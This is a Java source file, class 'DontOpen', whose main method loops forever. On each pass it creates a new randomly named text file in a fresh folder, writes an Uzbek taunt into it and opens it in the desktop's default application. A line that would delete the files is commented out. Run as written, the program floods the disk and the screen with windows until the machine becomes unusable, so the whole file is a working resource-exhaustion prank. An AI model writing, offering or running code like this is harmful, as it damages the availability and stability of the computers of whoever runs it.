package com.company.service;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.UUID;

public class DontOpen {
    public static void main(String[] args) {
        String folderName = "mf/My folder " + UUID.randomUUID();

        File folder = new File(folderName);
        folder.mkdirs();

        for (int i = 0; true; i++) {
            File file = new File(folder, String.valueOf(UUID.randomUUID()) + ".txt");
            try {
                file.createNewFile();
                PrintWriter writer = new PrintWriter(file);

                writer.println("Shuni bekor qilding");
                writer.close();

//                file.delete();

                Desktop.getDesktop().open(file);
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }
}
